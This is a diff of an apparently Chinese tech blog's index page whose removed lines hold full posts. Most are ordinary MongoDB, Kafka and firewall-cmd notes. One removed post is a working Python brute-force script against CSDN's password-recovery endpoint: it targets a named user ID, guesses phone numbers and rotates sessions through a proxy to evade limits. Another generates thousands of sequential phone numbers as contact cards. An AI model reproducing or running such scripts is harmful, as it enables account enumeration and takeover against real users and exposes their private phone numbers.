-          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">suffix = [1737124,1737125,1737126,1737127,1737128,1737129,1737106,1737107,1737108,1737109,1737142,1737143,1737144,1737145,1737148,1737149,1737196,1737197,1737198,1737199,1739600,1739601,1739602,1739603,1739604,1739605,1739606,1739607,1739608,1739609,1739610,1739611,1739612,1739613,1739614,1739615,1739616,1739617,1739618,1739998,1739820]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">out = open(&#x27;hw.vcf&#x27;,&#x27;w&#x27;)</span><br><span class="line"></span><br><span class="line">for ps in suffix:</span><br><span class="line">    for i in range(10):</span><br><span class="line">        for j in range(10):</span><br><span class="line">            phone = str(ps)+str(i)+str(j)+str(72)</span><br><span class="line"></span><br><span class="line">            out.writelines(&#x27;BEGIN:VCARD\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;VERSION:2.1\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;N:;&#x27;+phone+&#x27;;;;\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;FN:&#x27;+phone+&#x27;\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;TEL;CELL:&#x27;+phone+&#x27;\n&#x27;)</span><br><span class="line">            out.writelines(&#x27;END:VCARD\n&#x27;)</span><br><span class="line">out.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/vcf%E9%80%9A%E8%AE%AF%E5%85%B7%E7%94%9F%E6%88%90%E5%B0%8F%E5%B7%A5%E5%85%B7/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -783,9 +756,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:22:06 / 修改时间：11:22:12" itemprop="dateCreated datePublished" datetime="2024-09-10T11:22:06+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:22:06" itemprop="dateCreated datePublished" datetime="2024-09-10T11:22:06+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:19:16" itemprop="dateModified" datetime="2024-10-10T18:19:16+08:00">2024-10-10</time>
     </span>
 
   
@@ -798,16 +777,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.mongodb.com/try/download/community</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use zeus</span><br><span class="line">db.createUser(&#123;user:&quot;zeus&quot;,pwd:&quot;&lt;密码&gt;&quot;,roles:[&#123;role:&quot;readWrite&quot;,db:&quot;zeus&quot;&#125;]&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="更改字段名"><a href="#更改字段名" class="headerlink" title="更改字段名"></a>更改字段名</h3><h4 id="使用-rename操作："><a href="#使用-rename操作：" class="headerlink" title="使用$rename操作："></a>使用$rename操作：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">  &#123; &#125;, // 查询条件，可以为空以匹配所有文档</span><br><span class="line">  &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">      &quot;oldFieldName&quot;: &quot;newFieldName&quot; // 将旧字段名重命名为新字段名</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; multi: true &#125; // 如果需要更新多个文档，添加该选项</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<h4 id="使用-set操作："><a href="#使用-set操作：" class="headerlink" title="使用$set操作："></a>使用$set操作：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">db.collection.update(</span><br><span class="line">  &#123; &#125;, // 查询条件，可以为空以匹配所有文档</span><br><span class="line">  &#123;</span><br><span class="line">    $set: &#123;</span><br><span class="line">      newFieldName: &quot;$oldFieldName&quot; // 设置新字段名并保留旧字段值</span><br><span class="line">    &#125;,</span><br><span class="line">    $unset: &#123; &quot;oldFieldName&quot;: &quot;&quot; &#125; // 删除旧字段</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; multi: true &#125; // 如果需要更新多个文档，添加该选项</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-
-<h3 id="修改指定条件的数据"><a href="#修改指定条件的数据" class="headerlink" title="修改指定条件的数据"></a>修改指定条件的数据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;63f5e2ed7a2e3b097984c2f5&quot;), &quot;id&quot; : &quot;6a6a51dd&quot;, &quot;username&quot; : &quot;john&quot;, &quot;password&quot; : &quot;123123&quot;, &quot;last_time&quot; : &quot;2023-02-22 17:39:57&quot;, &quot;role&quot; : &quot;0&quot; &#125;  </span><br><span class="line">db.collection.update(</span><br><span class="line">  &#123; &quot;role&quot;: &quot;0&quot; &#125;, // 查询条件，匹配 role 等于 &quot;0&quot; 的文档</span><br><span class="line">  &#123;</span><br><span class="line">    $set: &#123; &quot;role&quot;: &quot;admin&quot; &#125; // 更新 role 字段的值为 &quot;admin&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123; multi: true &#125; // 如果有多个匹配的文档，需要添加此选项</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/mongodb-%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -861,9 +839,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:21:27 / 修改时间：11:45:44" itemprop="dateCreated datePublished" datetime="2024-09-10T11:21:27+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:21:27" itemprop="dateCreated datePublished" datetime="2024-09-10T11:21:27+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:46" itemprop="dateModified" datetime="2024-10-10T18:17:46+08:00">2024-10-10</time>
     </span>
 
   
@@ -876,7 +860,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os </span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getSession():</span><br><span class="line">    first_url = &#x27;https://passport.csdn.net/v1/api/riskControl/checkNVC?nvcValue=%7B%22a%22%3A%22FFFF00000000016C467E%22%2C%22c%22%3A%221688613163556%3A0.21894244156839582%22%2C%22d%22%3A%22nvc_other%22%2C%22h%22%3A%7B%22key1%22%3A%22code0%22%2C%22nvcCode%22%3A400%2C%22umidToken%22%3A%22T2gACAQzhrGorT9mwV5CHt-_qyy-qoMVHV2-x1zzSV0JMTq-2IbplBR6wmc9qMOw0rM%3D%22%7D%2C%22j%22%3A%7B%22test%22%3A1%7D%2C%22b%22%3A%22140%23O8%2BrQCV1zzZLYQo2LxcuAtSogFzRsrSXzeIuFE%2FW9FXQwElWDheX2fz1tBG9m45aV0bZ16vLI3DbQQxhMSMW0WOSrC4qlbzxhAUpJibRzzrfiXc9ltQzzPzbVXl%2FlbnUpDc%2BI3JjzHOb2XU%2BlPhtzPrC0LJBUHzrRHKBorvZrI7Zbs5zKXca0suOcyvTdklovdhyqxLJdFJFoZ5IGByma9AMKE9xgSD4xSLOdIY8M8P0zlMxKoAiFTZztbAc0dIsrz97nUSgbxm2vr%2FfV%2BwD0YKmqF1FDyGptA3Qm5Z8sq%2BxDXLf4vAUDFLfsWU4QMP2mALdCEkfxE6weX5tZrCdl3tl%2BhqgqAcSSBKd2OWA8UXXQU%2FTDPFfHTuZM3YOMl7U7N8X9QIa%2BQE3pvx4yEpV%2FrmAAeWXDYVhCma8SAgSdWLR3B5Cv%2BPSJIjnUt%2FQfzMPdyJecE2sCg4qNfZO%2BLQ4VvV0RxEZapJEujmcqga8bsn0qUw2NDFrB1p369RXzYtBJWf3542Rlkf9bHzHeIlMGviMy%2FLg%2BnHs9MiH65A9WJrr9URNtnCu%2F8ANoHX%2F7HZAqxGBpcczsTBDOJmIFV76rqrKgWhsh2qFTEDTcLhQ3qyruyDonuZZa3aYrOL%2FGg68npZaptl6SdiKgEbV9YPELlDOfQwKoCGMHcELSiFJdc0sdFfnPZvQOvu%2FEHCZud6mctgFct9or73wGLJTxw1%2BtTYOwOtjLQqpsyy8blgfUfNoD0IdYDmtt9ErElAylgtJbVFxULNIuUXjGHenLIfVPuBCbJzfZ2G1fI7eoEUhVb6Y99lvLZg3tsKHUFCfh35mcY2d14wuv0URXljLW%2FvVXjC7z46LJvXgeTwnr%2BY72yHOvTOVFZHEkZM3o%2FvskDrEHR5zp0zkj8O20UDWErp%2FPIq%2BfzJFbJNSzjEmsZ96qcdYUfzeQxNEckY%2FAA8uXfZ40HbLVZFNMHvFZ8DYCulzWD86SXwq3leoTbLbP3zeQD3xYelBEB0gvn8BjyeqL04CMpefIVZTjDGhX4hUAH9HiitpaOwqj9CLdlUc8%2BzoPVUQxQohh%2BvEu0anApyHWJRAyZSJqZ2Z9GWfEhNnW3MDZmyRttMVFltSr36shU9XoKgb7ngZ3dNVHl3bDC61GcTLz%2B3HDMooGR0pJqQhEFS1pLcX%2FVmev0PAeG%2BBiho%2FsVOerYWijWtIVOZVuiMvvpMuu5JeFD9vi2%2FqCsF%2FhjWLx92kI%2BCYM4kkinpFae4xJjx26RGNeWHoR5TdMUMEIDQu32FkXCKoKObrq4Sxj%2BWHlpLT9hC89TfN7mbgxm7RgU2z6vWUw3c788TWUfV%2BFe%2FqjswKWN8HScXCL50jPpUWpYqQ3A4j8tLjW%2FXBpLrK4Ko8MMUNw9q9tGOOWERMtidGKKK%2BFwUDPsBF9sKdd8nF%2FriRd76z%2BNBtJ6MFz67ypFz%2FyOxS71rpL3nZCCuu8%2BDq%2Bqdg%2BYHtMtViuPpHNtH4RAiPFSSa3JjjwMxux9Tc4n2N7n17vwYzTmJhhCWmgTy88ZesWKOw43Y1hSkdYF%3D%3D%22%2C%22e%22%3A%22-S-HwVTZwas7rhgz9dDdMRSb0Yik-NL1fJ_iHaL6PtA2ufvery5t6e1OxIGoUHpc7a0IbkE_0FA-F5WgiEpV7aeWlyQyxr1LL83v6PCoc3YbWdFNpRGiSow97HJFmhSolqL2iP8Yg3b6GvpNCl1IVLomrabwMw9l_LyWBRl400CVcL8m-z_SJFzz49oiy3dHQ-6yAdbxCew0CUvbYd9efp4IKNYdh5ElOOURlWM9mtU%22%7D&amp;callBackMethod=jsonp_02755569114381595&amp;source=user&#x27;</span><br><span class="line">    first_resp = requests.get(url=first_url,verify=False)</span><br><span class="line">    cookiejar = first_resp.cookies</span><br><span class="line">    cookies = requests.utils.dict_from_cookiejar(cookiejar)</span><br><span class="line">    print(cookies[&#x27;SESSION&#x27;])</span><br><span class="line">    return cookies[&#x27;SESSION&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def ennableSession(userId,session):</span><br><span class="line">    url = &#x27;https://passport.csdn.net/v1/service/usernames/&#123;&#125;?comeFrom=0&#x27;.format(userId)</span><br><span class="line">    headers = &#123;&#x27;Cookie&#x27;:&#x27;SESSION=&#x27;+session&#125;</span><br><span class="line">    res = requests.get(url=url,headers=headers,verify=False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:7890&quot;,</span><br><span class="line">           &quot;https&quot;:&quot;http://127.0.0.1:7890&quot;&#125;</span><br><span class="line">def verifyCode(session,mobile):</span><br><span class="line">    url = &#x27;https://passport.csdn.net/v1/fpwd/sendVerifyCode&#x27;</span><br><span class="line">    data = &#123;&quot;sendType&quot;:&quot;1&quot;,&quot;code&quot;:&quot;0086&quot;,&quot;mobileOrEmail&quot;:mobile&#125;</span><br><span class="line">    headers = &#123;&#x27;Cookie&#x27;:&#x27;SESSION=&#x27;+session,&#x27;Content-Type&#x27;:&#x27;application/json;charset=UTF-8&#x27;&#125;</span><br><span class="line">    resp = requests.post(url=url,data=json.dumps(data),headers=headers,verify=False,proxies=proxies)</span><br><span class="line"></span><br><span class="line">    content = resp.text</span><br><span class="line">    jd = json.loads(content)</span><br><span class="line">    if jd[&#x27;status&#x27;] == True:</span><br><span class="line">        print(mobile)</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        print(mobile + &#x27;    &#x27;+jd[&#x27;msg&#x27;])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    count = 0 </span><br><span class="line">    userId = &#x27;u013609938&#x27;</span><br><span class="line">    session = getSession()</span><br><span class="line">    ennableSession(userId,session)</span><br><span class="line">    </span><br><span class="line">    for i in range(1000,10000):</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        mobile = &#x27;134&#x27;+str(i)+&#x27;2596&#x27;</span><br><span class="line">        if verifyCode(session,mobile):</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        count += 1</span><br><span class="line">        if count &gt; 9:</span><br><span class="line">            count = 0</span><br><span class="line">            session = getSession()</span><br><span class="line">            ennableSession(userId,session)</span><br><span class="line">        </span><br><span class="line">def local():</span><br><span class="line">    userId = &#x27;u013609938&#x27;</span><br><span class="line">    count = 0 </span><br><span class="line">    fp = open(&#x27;C:\\Users\\test\\Desktop\\activate.txt&#x27;,&#x27;r&#x27;)</span><br><span class="line"></span><br><span class="line">    session = getSession()</span><br><span class="line">    ennableSession(userId,session)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    lines = fp.readlines()</span><br><span class="line">    for line in lines:</span><br><span class="line">        # time.sleep(0.1)</span><br><span class="line">        if verifyCode(session,line.replace(&#x27;\n&#x27;,&#x27;&#x27;)):</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">        count += 1</span><br><span class="line">        if count &gt; 9:</span><br><span class="line">            count = 0</span><br><span class="line">            session = getSession()</span><br><span class="line">            ennableSession(userId,session)</span><br><span class="line"></span><br><span class="line">local()</span><br><span class="line"></span><br><span class="line"># main()</span><br></pre></td></tr></table></figure>
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/CSDN%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E6%9A%B4%E7%A0%B4%E8%84%9A%E6%9C%AC/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -930,9 +922,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:20:01 / 修改时间：11:47:55" itemprop="dateCreated datePublished" datetime="2024-09-10T11:20:01+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:20:01" itemprop="dateCreated datePublished" datetime="2024-09-10T11:20:01+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:32" itemprop="dateModified" datetime="2024-10-10T18:17:32+08:00">2024-10-10</time>
     </span>
 
   
@@ -945,15 +943,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <p>kafka-console-consumer.sh 脚本是一个简易的消费者控制台。该 shell 脚本的功能通过调用 kafka.tools 包下的 ConsoleConsumer 类，并将提供的命令行参数全部传给该类实现。</p>
-<h3 id="消息消费"><a href="#消息消费" class="headerlink" title="消息消费"></a>消息消费</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server node1:9092,node2:9092,node3:9092 --topic topicName</span><br></pre></td></tr></table></figure>
-<p>表示从 latest 位移位置开始消费该主题的所有分区消息，即仅消费正在写入的消息。</p>
-<h3 id="从开始位置消费"><a href="#从开始位置消费" class="headerlink" title="从开始位置消费"></a>从开始位置消费</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server node1:9092,node2:9092,node3:9092 --from-beginning --topic topicName</span><br></pre></td></tr></table></figure>
-<p>表示从指定主题中有效的起始位移位置开始消费所有分区的消息。</p>
-<h3 id="显示key消费"><a href="#显示key消费" class="headerlink" title="显示key消费"></a>显示key消费</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server node1:9092,node2:9092,node3:9092 --property print.key=true --topic topicName</span><br></pre></td></tr></table></figure>
-<p>消费出的消息结果将打印出消息体的 key 和 value。</p>
-<p>若还需要为你的消息添加其他属性，请参考下述列表。<br>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29116427/article/details/80206125">https://blog.csdn.net/qq_29116427/article/details/80206125</a></p>
-
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/Kafka%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B9%8Bkafka-console-consumer-sh/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1007,9 +1005,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2024-09-10 11:19:38 / 修改时间：11:47:57" itemprop="dateCreated datePublished" datetime="2024-09-10T11:19:38+08:00">2024-09-10</time>
+      <time title="创建时间：2024-09-10 11:19:38" itemprop="dateCreated datePublished" datetime="2024-09-10T11:19:38+08:00">2024-09-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-10 18:17:40" itemprop="dateModified" datetime="2024-10-10T18:17:40+08:00">2024-10-10</time>
     </span>
 
   
@@ -1022,28 +1026,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
-<li>临时添加的规则，在reload后会失效</li>
-</ul>
-<h3 id="Zone"><a href="#Zone" class="headerlink" title="Zone"></a>Zone</h3><p>默认的zone是publice，在不指定zone的情况下规则会增加到public下</p>
-<h4 id="新建新区域"><a href="#新建新区域" class="headerlink" title="新建新区域"></a>新建新区域</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --new-zone=my-zone</span><br></pre></td></tr></table></figure>
-
-<h4 id="使新zone生效"><a href="#使新zone生效" class="headerlink" title="使新zone生效"></a>使新zone生效</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --set-default-zone=my-zone</span><br></pre></td></tr></table></figure>
-
-<h4 id="添加IP新区域"><a href="#添加IP新区域" class="headerlink" title="添加IP新区域"></a>添加IP新区域</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=my-zone--add-source=172.31.36.33</span><br></pre></td></tr></table></figure>
-
-<h4 id="添加端口新区域"><a href="#添加端口新区域" class="headerlink" title="添加端口新区域"></a>添加端口新区域</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=my-zone --add-port=443/tcp</span><br></pre></td></tr></table></figure>
-<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>配置外部地址的端口转发时，需开启地址转换功能<br>firewall-cmd [–permanent] –add-masquerade<br>firewall-cmd [–permanent] –remove-masquerade</p>
-<h4 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[--permanent] [--zone=zone] --list-forward-ports					# 列出所有的转发规则</span><br><span class="line">[--permanent] [--zone=zone] --add-forward-port=&lt;转发规则&gt;			# 添加转发规则</span><br><span class="line">[--permanent] [--zone=zone] --remove-forward-port=&lt;转发规则&gt;			# 删除转发规则</span><br></pre></td></tr></table></figure>
-
-<h4 id="转发规则"><a href="#转发规则" class="headerlink" title="转发规则"></a>转发规则</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 格式</span><br><span class="line">port=&lt;源端口号&gt;:proto=&lt;匹配协议&gt;:toport=&lt;目的端口号&gt;[:toaddr=&lt;目的IP地址&gt;]</span><br><span class="line"></span><br><span class="line"># 示例</span><br><span class="line">port=888:proto=tcp:toport=22										# 将888端口的tcp流量转发至22端口</span><br><span class="line">port=8080:proto=tcp:toport=80										# 将8080端口的tcp流量转发至80端口</span><br><span class="line">port=8081:proto=tcp:toport=80:toaddr=192.168.10.10					# 将8081端口的tcp流量转发至192.168.10.10的80端口</span><br></pre></td></tr></table></figure>
-
-<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --add-forward-port=port=443:proto=tcp:toport=27017     #443的流量转发到27017</span><br><span class="line">firewall-cmd --permanent --add-rich-rule=&quot;rule family=&quot;ipv4&quot; source address=&quot;172.31.36.33&quot; port protocol=&quot;tcp&quot; port=&quot;443&quot; accept&quot;     # 允许 172.31.36.33 访问本机443端口</span><br></pre></td></tr></table></figure>
-
-<h3 id="常规命令"><a href="#常规命令" class="headerlink" title="常规命令"></a>常规命令</h3><h4 id="端口开放、删除与查询"><a href="#端口开放、删除与查询" class="headerlink" title="端口开放、删除与查询"></a>端口开放、删除与查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --permanent --zone=public --add-port=27017/tcp   # 开放27017端口访问</span><br><span class="line">firewall-cmd --permanent --zone=public --remove-port=27017/tcp  # 删除27017端口访问</span><br><span class="line">firewall-cmd --zone=public --list-ports   # 查看所有已放行的端口</span><br></pre></td></tr></table></figure>
-
-
-<h4 id=""><a href="#" class="headerlink" title=""></a></h4>
+          <p>阅读全文</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2024/09/10/firewall-cmd-%E4%BD%BF%E7%94%A8-%E7%A4%BA%E4%BE%8B/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
